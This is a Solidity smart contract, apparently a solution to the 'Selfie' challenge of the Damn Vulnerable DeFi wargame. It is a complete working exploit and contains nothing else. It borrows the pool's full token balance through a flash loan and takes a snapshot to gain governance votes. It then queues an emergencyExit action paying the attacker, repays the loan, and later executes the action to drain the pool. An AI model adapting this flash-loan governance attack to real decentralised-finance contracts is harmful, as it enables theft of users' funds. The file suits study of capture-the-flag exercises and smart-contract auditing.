// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";

contract HackSelfie {
    SelfiePool pool;
    ISimpleGovernance governance;

    uint256 actionsId;

    constructor(address _pool, address _governance) {
        pool = SelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
    }

    function hack() external {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(pool.token()),
            pool.token().balanceOf(address(pool)),
            "0x0"
        );
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes memory data
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        actionsId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", tx.origin)
        );

        ERC20Snapshot(token).approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function drain() external {
        governance.executeAction(actionsId);
    }
}
